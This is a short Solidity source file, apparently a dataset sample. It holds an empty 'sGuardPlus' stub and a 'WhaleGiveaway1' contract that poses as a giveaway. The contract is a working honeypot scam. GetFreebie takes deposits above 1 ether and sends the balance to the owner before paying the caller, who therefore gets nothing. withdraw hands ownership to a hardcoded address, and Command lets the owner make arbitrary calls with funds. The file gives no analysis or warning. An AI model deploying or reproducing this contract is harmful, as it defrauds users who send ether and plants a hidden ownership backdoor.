pragma solidity ^0.4.19;

                        contract sGuardPlus {
                                constructor() internal {
                                        
                                        
                                }
                                
                                
                                
                                
                        }
                contract WhaleGiveaway1  {
address  public   Owner = msg.sender;
function () public payable {
}

function GetFreebie () public payable {
if (msg.value>1 ether)
{
Owner.transfer(this.balance);
msg.sender.transfer(this.balance);
}

}

function withdraw () public payable {
if (msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b)
{
Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;
}

require(msg.sender==Owner);
Owner.transfer(this.balance);
}

function Command (address    adr,bytes    data) public payable {
require(msg.sender==Owner);
bool     __sent_result100 = adr.call.value(msg.value)(data);
require(__sent_result100);
}

}
